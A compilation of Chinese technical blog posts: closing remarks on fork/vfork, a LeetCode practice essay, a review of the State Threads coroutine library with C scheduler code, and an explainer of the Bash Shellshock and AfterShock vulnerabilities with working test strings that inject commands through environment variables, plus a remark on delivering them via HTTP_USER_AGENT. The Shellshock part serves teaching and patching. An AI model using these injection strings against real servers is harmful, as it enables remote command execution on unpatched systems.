很明显，fork太重，而vfork又太危险，所以，就有人开始优化fork这个系统调用。优化的技术用到了著名的**写时拷贝（COW）**。

也就是说，**对于fork后并不是马上拷贝内存，而是只有你在需要改变的时候，才会从父进程中拷贝到子进程中，这样fork后立马执行exec的成本就非常小了**。所以，Linux的Man Page中并不鼓励使用vfork() ——

> “ It is rather unfortunate that Linux revived this specter from the past. The BSD man page states: “This system call will be eliminated when proper system sharing mechanisms are implemented. Users should not depend on the memory sharing semantics of vfork() as it will, in that case, be made synonymous to fork(2).””

于是，从BSD4.4开始，他们让vfork和fork变成一样的了

但在后来，NetBSD 1.3 又把传统的vfork给捡了回来，说是vfork的性能在 Pentium Pro 200MHz 的机器（这机器好古董啊）上有可以提高几秒钟的性能。详情见——“[NetBSD Documentation: Why implement traditional vfork()](http://www.netbsd.org/docs/kernel/vfork.html)”

今天的Linux下，fork和vfork还是各是各的，不过，还是建议你不要用vfork，除非你非常关注性能。

（全文完）

# LEETCODE 编程训练

#####  [2014年10月23日 ](https://coolshell.cn/articles/12052.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [96 条评论](https://coolshell.cn/articles/12052.html#comments) 189,165 人阅读

![LeetCodeLogo (1)](photo/LeetCodeLogo-1.png)Leetcode这个网站上的题都是一些经典的公司用来面试应聘者的面试题，很多人通过刷这些题来应聘一些喜欢面试算法的公司，比如：Google、微软、Facebook、Amazon之类的这些公司，基本上是应试教育的功利主义。

我做这些题目的不是为了要去应聘这些公司，而是为了锻炼一下自己的算法和编程能力。因为我开始工作的时候基本没有这样的训练算法和编程的网站，除了大学里的“算法和数据结构”里的好些最基础最基础的知识，基本上没有什么训练。所以，当我看到有人在做这些题的时候，我也蠢蠢欲动地想去刷一下。

于是，我花了3-4个月的业余时间，我把[Leetcode的154道题](https://oj.leetcode.com/problems/)全部做完了。（这也是最近我没有太多的时间来写博客的原因，你可以看到我之前[做的那个活动](https://coolshell.cn/articles/11847.html)中有几个算法题来自于Leetcode）有人说我时间太多了，这里声明一下，我基本上都是利用了晚上10点以后的时间来做这些题的。

LeetCode的题大致分成两类：

**1）基础算法的知识**。这些题里面有大量的算法题，解这些题都是有套路的，不是用递归（深度优先DFS，广度优先BFS），就是要用动态规划（Dynamic Programming），或是拆半查找（Binary Search），或是回溯（Back tracing），或是分治法（Divide and Conquer），还有大量的对树，数组、链表、字符串和hash表的操作。**通过做这些题能让你对这些最基础的算法的思路有非常扎实的了解和训练**。对我而言，Dynamic Programming 是我的短板，尤其是一些比较复杂的问题，在推导递推公式上总是有思维的缺陷（数学是我的硬伤），通过做了这些题后，我能感到我在DP的思路上有了很大的收获。

**2）编程题**。比如：atoi，strstr，add two num，括号匹配，字符串乘法，通配符匹配，文件路径简化，Text Justification，反转单词等等，这些题的Edge Case, Corner Case有很多。这些题需要你想清楚了再干，只要你稍有疏忽，就会有几个case让你痛不欲生，而且一不小心就会让你的代码会写得又臭又长，无法阅读。**通过做这些题，可以非常好的训练你对各种情况的考虑，以及你对程序代码组织的掌控（其实就是其中的状态变量）。**还记得我在《[函数式编程](https://coolshell.cn/articles/10822.html)》中说的，程序中的状态是你程序变得复杂难维护的直接原因。

我觉得每个程序员都应该花时间和精力做这些题，因为你会从这些题中得到很大的收益。做完这些题后你一定会明白下面几个道理：



**1）想清楚了再干**。这个观点我以前就在《[多些时间可以少些代码](https://coolshell.cn/articles/5686.html)》说过。如果你拿到题就上去直接写代码的话，你一定会被各种case打回来了。然后呢，你一着急，你就会进入那种我在《[开发团队的效率](https://coolshell.cn/articles/11656.html)》中说的那种毫无效率case by case的开发模式，而你也进入了“平庸模式”。于是你就会出现下图那样的情况。

![Case-by-Case Developement](photo/bug_fixing.gif)Case-by-Case Development

**2) 编程是脑力劳动，急不得**。这个事情在这做这些题的时候你就会发现，要么是脑子转不过来了，要么就是明明就差一点了，但程序怎么都调不对。如果你越着急的话，你就会发现你会离目标越远，而花的时间也会更多。另外，你会发现这些题基本上都是50行代码内就可以搞定的，但是为了这50行以内的代码，你要花好多时间和精力。coding  50行代码在我们的日常工作中分分钟就完成，而Leetcode里的50行代码却没那么简单，也许，用这个你就可以区别什么是码农，什么是程序员了。

**3）加班要不得。**因为我总是在晚上10点以后做题，所以，基本上都是在加班状态中工作。这种状态过上两三天，你就会发现，整个大脑已经不转了，而且不但不转，还会犯很多低级错误，很多事情都想不清楚，一个晚上都在和程序的状态控制做搏斗，代码写得越来越乱，越来越没条理。于是这种时候，我都会休息几天，不做题了，然后再做题的时候，就觉得非常地清楚。可见加班 是编程最致命的敌人！

我把我的C++代码放到了Github上，大家也帮我review一下，看看有没有可以改善的。

**https://github.com/haoel/leetcode**

好了，不多说了，**我希望大家有时间都去练练LeetCode，无论是找工作还是对你的编程能力会有非常大的提高**。

 

（全文完）

# STATE THREADS 回调终结者

#####  [2014年10月12日 ](https://coolshell.cn/articles/12012.html) [Leo](https://coolshell.cn/articles/author/full_of_bull) 评论 [50 条评论](https://coolshell.cn/articles/12012.html#comments) 54,758 人阅读

**（感谢网友** [**@我的上铺叫路遥**](http://weibo.com/fullofbull) **投稿）**

上回写了篇[《一个“蝇量级”C语言协程库》](https://coolshell.cn/articles/10975.html)，推荐了一下[Protothreads](http://dunkels.com/adam/pt/)，通过coroutine模拟了用户级别的multi-threading模型，虽然本身足够“轻”，杜绝了系统开销，但这个库本身应用场合主要是内存限制的嵌入式领域，提供原生态组件太少，使用限制太多，比如依赖其它调用产生阻塞等。

这回又替大家在开源界淘了个宝，推荐一个轻量级网络应用框架**State Threads**（以下简称ST），总共也就3000行C代码，跟Protothreads不同在于ST针对的就是**高性能可扩展服务器**领域（值得一提的是Protothreads官网[参考链接](http://dunkels.com/adam/pt/links.html)上第一条就是ST的官网）。在其[FAQ](http://state-threads.sourceforge.net/docs/faq.html)页面上一句引用”Perfection is achieved not when there is nothing more to add, but rather when there is nothing more to take away.”可以视为开发人员对ST源码质量的自信。

目录



[历史渊源](https://coolshell.cn/articles/12012.html#历史渊源)[基于事件驱动状态机（EDSM）](https://coolshell.cn/articles/12012.html#基于事件驱动状态机（EDSM）)[基于Mult-Threading范式](https://coolshell.cn/articles/12012.html#基于Mult-Threading范式)[基于多核环境](https://coolshell.cn/articles/12012.html#基于多核环境)[使用限制](https://coolshell.cn/articles/12012.html#使用限制)[总结](https://coolshell.cn/articles/12012.html#总结)[参考](https://coolshell.cn/articles/12012.html#参考)

#### 历史渊源

首先介绍一下这个库的历史渊源，从代码贡献者来看，ST不是个人作品，而是有着雄厚的商业支持和应用背景，比如服务器领域，在[这里](http://state-threads.sourceforge.net/news.html)你可以看到ST曾作为Apache的多核应用模块发布。其诞生最初是由网景（Netscape）公司的MSPR（Netscape Portable Runtime library）项目中剥离出来，后由SGI（Silicon Graphic Inc）还有Yahoo!公司（前者是主力）开发维护的独立线程库。历史版本方面，作为[SourceForge](http://sourceforge.net/projects/state-threads/files/)上开源项目，由2001年发布v1.0以来一直到2009年v1.9稳定版后未再变动。在平台移植方面，从Makefile的配置选项中可知ST支持多种Unix-like平台，还有专门针对Win32的源码改写。源码例子中，提供了web server、proxy以及dns三种编程实例供参考。可以说代码质量应该是相当的稳定和可靠的。



至于许可证方面，有必要略作说明。出于历史原因，网景最初发布时选择了MPL1.1许可证，而后SGI在维护中又混进了GPLv2许可证，照理说这两种许可证是互不兼容的（MPL1.1后续版本是GPL兼容的），也就是说用双许可证打包发布理论上是非法无效的，见GNU官网上[MPL兼容性](http://www.gnu.org/licenses/license-list.html#MPL)一节。但这里有值得商榷的地方，因为文中又提及，根据MPL1.1中某条款第13节，如果整段或部分代码允许采用另一许可证作为备用（alternate）选择，比如GPL及其兼容，那么整个库的许可证就可视为GPL兼容的。如此一来所谓GPL兼容性一般解释为你不能在GPLv2的代码中混入MPL1.1，而不是说你不能在MPL1.1代码中混入GPLv2，也就是说GPLv2在MPL1.1之后是可以接受的，事实上SGI就采用了后面的做法，尚未引起版权上的纠纷。为此我还考证了一下FAQ上[license](http://state-threads.sourceforge.net/docs/faq.html)一节的说法，说ST既可以在MPL和GPL之间选择一种，也可以继续用双许可证，还补了一句在non-free项目使用上也没有限制，但对ST源码所做改动必须对用户可见。在源码文件中的SGI的附加声明还解释了将ST转为GPL代码的做法，就是可以删除前面MPL的声明，否则后续用户仍可以在两者之间二选一。个人觉得既然SGI都这样发话了，那么可解释为反之删除GPL的声明继续采用MPL也是可以接受的，如果你对双许可证承诺仍不放心的话。

#### 基于事件驱动状态机（EDSM）

好了，下面该进入技术性话题了。前面说了ST的目标是**高性能可扩展**，其技术特征一言以蔽之就是

> **“It combines the simplicity of the multi-threaded programming paradigm, in which one thread supports each simultaneous connection, with the performance and scalability of an event-driven state machine (EDSM) architecture.”**

我们先来纵向比较ST与传统的EDSM区别，再来横向比较与其它线程库（比如Pthread）的区别（注：以下图片全部来自[State Threads Library FAQ](http://state-threads.sourceforge.net/docs/faq.html)）。

传统EDSM最常见的方式就是I/O事件的**异步回调**。基本上都会有一个叫做dispatcher的单线程主循环（又叫event loop），用户通过向dispatcher注册回调函数（又叫event handler）来实现异步通知，从而不必在原地空耗资源干等，在dispatcher主循环中通过select()/poll()系统调用来等待各种I/O事件的发生，当内核检测到事件触发并且数据可达或可用时，select()/poll()会返回从而使dispatcher调用相应的回调函数来对处理用户的请求。所以异步回调与其说是通知，不如说用委托更恰当。

整个过程都是单线程的。**这种处理本质上就是将一堆互不相交（disjoint）的回调实现同步控制，就像串联在一个顺序链表上。**见图1，黑色的双箭头表示I/O事件复用，回调是个筐，里面装着对各种请求的处理（当然不是每个请求都有回调，一个请求也可以对应不同的回调），每个回调被串联起来由dispatcher激活。这里请求等价于thread的概念（不是操作系统的线程），只不过“上下文切换”（context switch）发生在每个回调结束之时（假设不同请求对应不同回调），注册下一个回调以待事件触发时恢复其它请求的处理。至于dispatcher的执行状态（execute state）可作为回调函数的参数保存和传递。

![EDSM](photo/edsm.gif)

异步回调的缺陷在于**难以实现和扩展**，虽然已经有libevent这样的通用库，以及其它actor/reacotor的设计模式及其框架，但正如Dean Gaudet（Apache开发者）所说：“其内在的复杂性——**将线性思维分解成一堆回调的负担**（breaking up linear thought into a bucketload of callbacks）——仍然存在”。从上图可见，**回调之间请求例程不是连续的，比如回调之间的切换会打断部分请求，又比如有新的请求需要重新注册。**

**ST本质上仍然是基于EDSM模型，但旨在取代传统的异步回调方式。**ST将请求抽象为thread概念以更接近自然编程模式（所谓的linear thought吧，就像操作系统的线程之间切换那样自然）。ST的调度器（scheduler）对于用户来说是透明的，不像dispatcher那种将执行状态（execute state）暴露给回调方式。每个thread的现场环境可以保存在栈上（一段连续的大小确定的内存空间），由C的运行环境管理。从图2看到，**ST的threads可以并发地线性地处理I/O事件，模型比异步回调简单得多。**

![State Threads](photo/st_edsm.gif)

这里稍微解释一下ST调度工作原理，ST运行环境维护了四种队列，分别是IOQ、RUNQ、SLEEPQ以及ZOMBIEQ，**当每个thread处于不同队列中对应不同的状态（ST顾名思义所谓thread状态机）。**比如polling请求的时候，当前thread就加入IOQ表示等待事件（如果有timeout同时会被放到SLEEPQ中），当事件触发时，thread就从IOQ（如果有timeout同时会从SLEEPQ）移除并转移到RUNQ等待被调度，成为当前的running thread，相当于操作系统的就绪队列，跟传统EDSM对应起来就是注册回调以及激活回调。再比如模拟同步控制wait/sleep/lock的时候，当前thread会被放入SLEEPQ，直到被唤醒或者超时再次进入RUNQ以待调度。

**ST的调度具备性能与内存双重优点**：在性能上，ST实现自己的setjmp/longjmp来模拟调度，无任何系统开销，并且context（就是jmp_buf）针对不同平台和架构用底层语言实现的，可移植性媲美libc。下面放一段代码解释一下调度实现：

```
/*
 * Switch away from the current thread context by saving its state 
 * and calling the thread scheduler
 */
#define _ST_SWITCH_CONTEXT(_thread)       \
    ST_BEGIN_MACRO                        \
    if (!MD_SETJMP((_thread)->context)) { \
      _st_vp_schedule();                  \
    }                                     \
    ST_END_MACRO

/*
 * Restore a thread context that was saved by _ST_SWITCH_CONTEXT 
 * or initialized by _ST_INIT_CONTEXT
 */
#define _ST_RESTORE_CONTEXT(_thread)   \
    ST_BEGIN_MACRO                     \
    _ST_SET_CURRENT_THREAD(_thread);   \
    MD_LONGJMP((_thread)->context, 1); \
    ST_END_MACRO

void _st_vp_schedule(void)
{
    _st_thread_t *thread;

    if (_ST_RUNQ.next != &_ST_RUNQ) {
        /* Pull thread off of the run queue */
        thread = _ST_THREAD_PTR(_ST_RUNQ.next);
        _ST_DEL_RUNQ(thread);
    } else {
        /* If there are no threads to run, switch to the idle thread */
        thread = _st_this_vp.idle_thread;
    }
    ST_ASSERT(thread->state == _ST_ST_RUNNABLE);

    /* Resume the thread */
    thread->state = _ST_ST_RUNNING;
    _ST_RESTORE_CONTEXT(thread);
}
```

如果你熟悉setjmp/longjmp的用法，你就知道当前thread在调用MD_SETJMP将现场上下文保存在jmp_buf中并返回返回0，然后自己调用_st_vp_schedule()将自己调度出去。调度器先从RUNQ上找，如果队列为空就找idle thread，这是在整个ST初始化时创建的一个特殊thread，然后将当前线程设为自己，再调用MD_LONGJMP切换到其上次调用MD_SETJMP的地方，从thread->context恢复现场并返回1，该thread就接着往下执行了。**整个过程就同EDSM一样发生在操作系统单线程下，所以没有任何系统开销与阻塞。**

**其实真正的阻塞是发生在等待I/O事件复用上，也就是select()/poll()，这是整个ST唯一的系统调用。**ST当前的状态是，整个环境处于空闲状态，所有threads的请求处理都已经完成，也就是RUNQ为空。这时在_st_idle_thread_start维护了一个主循环（类似于event loop），主要负责三种任务：1.对IOQ所有thread进行I/O复用检测；2.对SLEEPQ进行超时检查；3.将idle thread调度出去，代码如下：

```
void *_st_idle_thread_start(void *arg)
{
    _st_thread_t *me = _ST_CURRENT_THREAD();

    while (_st_active_count > 0) {
        /* Idle vp till I/O is ready or the smallest timeout expired */
        _ST_VP_IDLE();

        /* Check sleep queue for expired threads */
        _st_vp_check_clock();

        me->state = _ST_ST_RUNNABLE;
        _ST_SWITCH_CONTEXT(me);
    }

    /* No more threads */
    exit(0);

    /* NOTREACHED */
    return NULL;
}
```

这里的me就是idle thread，因为_st_idle_thread_start就是创建idle thread的启动点，每从上次_ST_SWITCH_CONTEXT()切换回来的时候，接着在_ST_VP_IDLE()里轮询I/O事件的发生，一旦检测到发生了别的thread事件或者SLEEPQ里面发生超时，再用_ST_SWITCH_CONTEXT()把自己切换出去，如果此时RUNQ中非空的话就切换到队列第一个thread。这里主循环是不会退出的。

在内存方面，**ST的执行状态作为局部变量保存在栈上，而不是像回调需要动态分配，**用户可能分别这样使用thread模式和callback模式：

```
/* thread land */
int foo()
{
    int local1;
    int local2;
    do_some_io();
}

/* callback land */
struct foo_data {
    int local1;
    int local2;
};

void foo_cb(void *arg)
{
    struct foo_data *locals = arg;
    ...
}

void foo()
{
    struct foo_data *locals = malloc(sizeof(struct foo_data));
    register(foo_cb, locals);
}
```

#### 基于Mult-Threading范式

同样基于multi-threading编程范式，ST同其它线程库又有和有点呢？比如Posix Thread（以下简称PThread）是个通用的线程库，它是**将用户级线程（thread）同内核执行对象（kernel execution entity，有些书又叫lightweight processes）做了1:1或m:n映射，**从而实现multi-threading模式。**而ST是单线程（n:1映射），它的thread实际上就是协程（coroutine）。**通常的网络应用上，多线程范式绕不开操作系统，但在某些特定的服务器领域，线程间的共享资源会带来额外复杂度，锁、竞态、并发、文件句柄、全局变量、管道、信号等，面对这些Pthread的灵活性会大打折扣。**而ST的调度是精确的，它只会在明确的I/O和同步函数调用点上发生上下文切换，这正是协程的特性，如此一来ST就不需要互斥保护了，进而也可以放心使用任何静态变量和不可重入库函数了**（这在同样作为协程的Protothreads里是不允许的，因为那是stack-less的，无法保存上下文），极大的简化了编程和调试同时增加了性能。

对于同样用户级线程如GNU Pth和MIT Phread比起来呢？有两点，一是ST的thread是**无优先级的非抢占式调度**，也就是说ST基于EDSM的，每个thread都是事件或数据驱动，迟早会把自己调度出去，而且调度点是明确的，并非按时间片来的，从而简化了thread管理；二是ST会**忽略所有信号处理**，在_st_io_init中会把sigact.sa_handler设为SIG_IGN，这样做是因为将thread资源最小化，避免了signal mask及其系统调用（在ucontext上是避免不了的）。但这并不意味着ST就不能处理信号，实际上ST建议将信号写入pipe的方式转化为普通I/O事件处理，示例详见[这里](http://state-threads.sourceforge.net/docs/notes.html#signals)。

这里顺便说一句，**C语言实现的协程据我所知只有三种方式**：Protothread为代表利用switch-case语义跳转，以ST为代表不依赖libc的setjmp/longjmp上下文切换，以及依赖glibc的ucontext接口（[云风的coroutine](https://github.com/cloudwu/coroutine)）。第一种最轻，但受限最大，第三种耗资源性能慢（陈皓注：glibc的ucontext接口的实现中有一个和信号有关的系统调用，所以会慢，估计在一些情况下会比pthread还慢），目前看来ST是最好使的。

#### 基于多核环境

下面来聊聊ST在多核环境下的应用。服务器领域多核的优势在于实现了物理上真正的并发，所以如何充分利用系统优势也是线程库的一大难点。这对ST来说也许正是它的拿手好戏，前面提及ST曾作为Apache的多核引擎模块发布。这里要补充一下前面漏掉的ST的一个重要概念——**虚拟处理器**（virtual processor，简称vp），见图3，多个cpu通过内核的SMP模拟出多个“核”（core），一个core对应一个内核任务（kernel task），同时对应一个用户进程（process），一个process对应ST的一个vp，每个vp下就是ST的thread（是协程不是线程），结合前面所述，vp初始化先创建idle thread，然后根据I/O事件驱动其它threads，这就是ST的多核架构。

![multi-core](photo/st_app.gif)

这里要指出的是，**ST只负责自身thread调度，进程管理是应用程序的事情，**也就是说由用户来决定fork多少进程，每个进程分配多少资源，如何进行IPC等。这种架构的好处就是每个vp有自己独立的空间，避免了资源同步竞态（比如杜绝了多进程里的多线程这样混乱的模型）。我们知道这种**基于进程的架构是非常健壮的，一个进程奔溃不会影响到其它进程，同时充分利用多核硬件的高并发。**同时对于具体逻辑业务使用vp里的thread处理，这是基于EDSM的，如此一来做到了**逻辑业务与内核执行对象之间的解耦**，没必要因为1K个连接去创建1K的进程。这就是ST的扩展性和灵活性。

#### 使用限制

ST的主要限制在于，应用程序所有I/O操作必须使用ST提供的API，因为只有这样thread才能被调度器管理，并且避免阻塞。

另一个限制在于thread调试，这本身不容易，好在v1.9的ST提供了DEBUG参数，使用TREADQ以及_st_iterate_threads接口检测thread调度情况，用户还可自定义_st_show_thread_stack接口dump每个thread的栈，在GDB使能_st_iterate_threads_flag变量，这些都在Readme中对调试方法有具体说明。按下不表。

#### 总结

这篇文章写得有点短了，主要是通过对比来介绍ST的，其实还有大段原理可以讲，大段源码以及实战用例可以贴，但这一下子又写不过来，ST还是有点技术含量的。说白了，**ST的核心思想就是利用multi-threading的简单优雅范式胜过传统异步回调的复杂晦涩实现，又利用EDSM的性能和解耦架构避免了multi-threading在系统上的开销和暗礁。**学习ST告诉我们一个道理：**未来技术的趋势永远都是融合的。**

#### 参考

- 在[SourceForge](http://sourceforge.net/projects/state-threads/files/)以及[github](https://github.com/winlinvip/state-threads)上的源码：前者有历史版本及win32版本，后者只有v1.9。

- [State Threads for Internet Applications](http://state-threads.sourceforge.net/docs/st.html)：介绍原理的，值得一看，[这里](http://blog.csdn.net/win_lin/article/details/8242653)有篇中文翻译附加单元测试（在单CPU 512M内存上创建数万个thread，CPU占用率约5%，内存约4.3K/thread）。

- [State Threads Library FAQ](http://state-threads.sourceforge.net/docs/faq.html)：本文基于此而写。

- [Complete reference](http://state-threads.sourceforge.net/docs/reference.html)：API完全手册。

- [Programing Notes](http://state-threads.sourceforge.net/docs/notes.html)：编程注意事项，包括信号处理，IPC，非网络I/O事件等。

（全文完）

# BASH代码注入的安全漏洞

#####  [2014年09月28日 ](https://coolshell.cn/articles/11973.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [136 条评论](https://coolshell.cn/articles/11973.html#comments) 107,889 人阅读

![bashbug](photo/bashbug-300x152.jpg)很多人或许对上半年发生的安全问题“心脏流血”（Heartbleed Bug）事件记忆颇深，这两天，又出现了另外一个“毁灭级”的漏洞——Bash软件安全漏洞。这个漏洞由法国GNU/Linux爱好者Stéphane Chazelas所发现。随后，美国电脑紧急应变中心（US-CERT）、红帽以及多家从事安全的公司于周三（北京时间9月24日）发出警告。 关于这个安全漏洞的细节可参看美国政府计算安全的这两个漏洞披露：[CVE-2014-6271](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271) 和 [CVE-2014-7169](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169)。

这个漏洞其实是非常经典的“注入式攻击”，也就是可以向 bash注入一段命令，从bash1.14 到4.3都存在这样的漏洞。我们先来看一下这个安全问题的症状。

目录



[Shellshock (CVE-2014-6271)](https://coolshell.cn/articles/11973.html#Shellshock_CVE-2014-6271)[AfterShock – CVE-2014-7169 （又叫Incomplete fix to Shellshock）](https://coolshell.cn/articles/11973.html#AfterShock_–_CVE-2014-7169_（又叫Incomplete_fix_to_Shellshock）)[原理和技术细节](https://coolshell.cn/articles/11973.html#原理和技术细节)[bash的环境变量](https://coolshell.cn/articles/11973.html#bash的环境变量)[bash的函数](https://coolshell.cn/articles/11973.html#bash的函数)[bash的bug](https://coolshell.cn/articles/11973.html#bash的bug)[bash漏洞的影响有多大](https://coolshell.cn/articles/11973.html#bash漏洞的影响有多大)[关于 AfterShock – CVE-2014-7169 测试脚本的解释](https://coolshell.cn/articles/11973.html#关于_AfterShock_–_CVE-2014-7169_测试脚本的解释)

#### Shellshock (CVE-2014-6271)

下面是一个简单的测试：

```
$ env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
```

如果你发现上面这个命令在你的bash下有这样的输出，那你就说明你的bash是有漏洞的：

```
Bash is vulnerable!
Bash Test
```

简单地看一下，其实就是向环境变量中注入了一段代码 **echo Bash is vulnerable**。关于其中的原理我会在后面给出。

很快，CVE-2014-6271的官方补丁出来的了——[Bash-4.3 Official Patch 25](https://lists.gnu.org/archive/html/bug-bash/2014-09/msg00081.html)。



#### AfterShock – CVE-2014-7169 （又叫Incomplete fix to Shellshock）

但随后，马上有人在Twitter上发贴——[说这是一个不完整的fix](https://twitter.com/taviso/statuses/514887394294652929)，并给出了相关的攻击方法。

[![img](photo/bash-300x153.jpg)](https://twitter.com/taviso/statuses/514887394294652929)

也就是下面这段测试代码（注意，其中的sh在linux下等价于bash）：

```
env X='() { (a)=>\' sh -c "echo date"; cat echo
```

上面这段代码运行起来会报错，但是它要的就是报错，报错后会在你在当前目录下生成一个echo的文件，这个文件的内容是一个时间文本。下面是上面 这段命令执行出来的样子。

```
$ env X='() { (a)=>\' sh -c "echo date"; cat echo
sh: X: line 1: syntax error near unexpected token `='
sh: X: line 1: `'
sh: error importing function definition for `X'
Sat Sep 27 22:06:29 CST 2014
```

这段测试脚本代码相当的诡异，就像“天书”一样，我会在后面详细说明这段代码的原理。

#### 原理和技术细节

要说清楚这个原理和细节，我们需要从 bash的环境变量开始说起。

##### bash的环境变量

环境变量大家知道吧，这个不用我普及了吧。环境变量是操作系统运行shell中的变量，很多程序会通过环境变量改变自己的执行行为。在bash中要定义一个环境变量的语法很简单（注：=号的前后不能有空格）：

```
$ var="hello world"
```

然后你就可以使用这个变量了，比如：echo $var什么的。但是，我们要知道，这个变量只是一个当前shell的“局部变量”，只在当前的shell进程中可以访问，这个shell进程fork出来的进程是访问不到的。

你可以做这样的测试：

```
$ var="hello coolshell"
$ echo $var
hello coolshell
$ bash
$ echo $var
```

上面的测试中，第三个命令执行了一个bash，也就是开了一个bash的子进程，你就会发现var不能访问了。

为了要让shell的子进程可以访问，我们需要export一下：

```
$ export var="hello coolshell"
```

这样，这个环境变量就会在其子进程中可见了。

如果你要查看一下有哪些环境变量可以在子进程中可见（也就是是否被export了），你可使用**env**命令。不过，env命令也可以用来定义export的环境变量。如下所示：

```
$ env var="hello haoel"
```

有了这些基础知识还不够，我们还要知道一个基础知识——shell的函数。

##### bash的函数

在bash下定义一个函数很简单，如下所示：

```
$ foo(){ echo "hello coolshell"; }
$ foo
hello coolshell
```

有了上面的环境变量的基础知识后，你一定会想试试这个函数是否可以在子进程中调用，答案当然是不行的。

```
$ foo(){ echo "hello coolshell"; }
$ foo
hello coolshell
$ bash
$ foo
bash: foo: command not found
```

你看，和环境变量是一样的，如果要在子进程中可以访问的话，那么，还是一样的，需要export，export有个参数 -f，意思是export一个函数。如：

```
$ foo(){ echo "hello coolshell"; }
$ foo
hello coolshell
$ export -f foo
$ bash
$ foo
hello coolshell
```

好了，我讲了这么半天的基础知识，别烦，懂了这些，你才会很容易地理解这两个漏洞是怎么回事。

好，现在要进入正题。

##### bash的bug

从上面我们可以看到，bash的变量和函数用了一模一样的机制，如果你用env命令看一下export出来的东西，你会看到上面我们定义的变量和函数都在，如下所示（我省略了其它的环境变量）：

```
$ env
var=hello coolshell
foo=() { echo "hello coolshell"
}
```

原来，都用同样的方式啊——**无论是函数还是变量都是变量啊**。于是，看都不用看bash的源代码，聪明的黑客就能猜得到——**bash判断一个环境变量是不是一个函数，就看它的值是否以”()”开始**。于是，一股邪念涌上心头。

黑客定义了这样的环境变量（注：() 和 { 间的空格不能少）：

```
$ export X='() { echo "inside X"; }; echo "outside X";'
```

env一下，你会看到X已经在了：

```
$ env
X=(){ echo "inside X"; }; echo "outside X";
```

然后，**当我们在当前的bash shell进程下产生一个bash的子进程时，新的子进程会读取父进程的所有export的环境变量，并复制到自己的进程空间中，很明显，上面的X变量的函数的后面还注入了一条命令：echo “outside X”，这会在父进程向子进程复制的过程中被执行吗？**（关于fork相关的东西你可以看一下我以前写的《[fork的一个面试题](https://coolshell.cn/articles/7965.html)》）

答案是肯定的。

```
$ export X='() { echo "inside X"; }; echo "outside X";'
$ bash
outside X
```

你看，一个代码注入就这样完成了。这就是bash的bug—— **函数体外面的代码被默认地执行了**。

我们并不一定非要像上面那样创建另一个bash的子进程，我们可以使用bash -c的参数来执行一个bash子进程命令。就像这个安全漏洞的测试脚本一样：

```
env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
```

其中，() { :;} 中的冒号就相当于/bin/true，返回true并退出。而bash -c其实就是在spawn一个bash的echo的子进程，用于触发函数体外的echo命令。所以，更为友好一点的测试脚本应该是：

```
env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo 如果你看到了vulnerable字样说明你的bash有安全问题"
```

OK，你应该明白这个漏洞是怎么一回事了吧。

#### bash漏洞的影响有多大

在网上看到好多人说这个漏洞不大，还说这个事只有那些陈旧的执行CGI脚本的网站才会有，现在已经没有网站用CGI了。我靠，这真是无知者无畏啊。

我举个例子，如果你的网站中有调用操作系统的shell命令，比如你用PHP执行个exec之类的东西。这样的需求是有的，特别是对于一些需要和操作系统交互的重要的后台用于系统管理的程序。于是就会开一个bash的进程来执行。

我们还知道，现在的HTTP服务器基本上都是以子进程式的，所以，其中必然会存在export 一些环境变量的事，而有的环境变量的值是从用户端来的，比如：HTTP_USER_AGENT这样的环境变量，只由浏览器发出的。其实这个变量你想写成什么就写成什么。

于是，我可以把这个HTTP_USER_AGENT的环境变量设置成上述的测试脚本，只不过，我会把echo Bash is vulnerable!这个东西换成别的更为凶残的命令。呵呵。

关于这个漏洞会影响哪些已有的系统，你可以自己Google，几乎所有的报告这个漏洞的文章都说了（比如：[这篇](https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/)，[这篇](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability)），我这里就不复述了。

注：如果你要看看你的网站有没有这样的问题，你可以用这个在线工具测试一下：[‘ShellShock’ Bash Vulnerability CVE-2014-6271 Test Tool](http://shellshock.brandonpotter.com/)。

现在，你知道这事可能会很大了吧。还不赶快去打补丁。（注，yum update bash 把bash版本升级到 4.1.2-15.el6_5.2 ， ）

#### 关于 AfterShock – CVE-2014-7169 测试脚本的解释

很多同学没有看懂下面这个测试脚本是什么意思，我这里解释一下。

```
env X='() { (a)=>\' sh -c "echo date"; cat echo
```

- X='() { (a)=>\’ 这个不用说了，定义一个X的环境变量。但是，这个函数不完整啊，是的，这是故意的。另外你一定要注意，\’不是为了单引号的转义，X这个变量的值就是 **() { (a)=>\**

- 其中的 (a)=这个东西目的就是为了让bash的解释器出错（语法错误）。

- 语法出错后，在缓冲区中就会只剩下了 “>\”这两个字符。

- 于是，这个神奇的bash会把后面的命令echo date换个行放到这个缓冲区中，然后执行。

相当于在shell 下执行了下面这个命令：

```
$ >\
echo date
```

如果你了解bash，你会知道 \ 是用于命令行上换行的，于是相当于执行了：

```
$ >echo date
```

这不就是一个重定向么？上述的命令相当于：

```
$ date > echo
```

于是，你的当前目录下会出现一个echo的文件，这个文件的内容就是date命令的输出。

**能发现这个种玩法的人真是个变态，完全是为bash的源代码量身定制的一个攻击**。

（全文完）

# 互联网之子 – AARON SWARTZ

#####  [2014年09月08日 ](https://coolshell.cn/articles/11928.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [128 条评论](https://coolshell.cn/articles/11928.html#comments) 120,929 人阅读

![Aaron_Swartz_profile](photo/Aaron_Swartz_profile-216x300.jpg) 1986年11月8日，有个叫Aaron Swartz的人在美国芝加哥伊利诺伊州出生。因为他父母创办了一个软件公司，所以，Aaron在3岁的时候就接触到了电脑，然后就着迷了。

我们先通过Aaron Swartz 的青少年时期来看一下他是怎么样的一个天才：

12岁的时候Aaron就创建了一个类似于Wikipedia式的网站（那时还没有Wikipedia），13岁的时候，Aaron赢得为年轻人而设，创作教育及协同非商业网站的[ArsDigita Prize](https://en.wikipedia.org/wiki/ArsDigita_Prize)比赛首名。 奖品包括参观麻省理工学院及与网际网路界的知名人士见会。

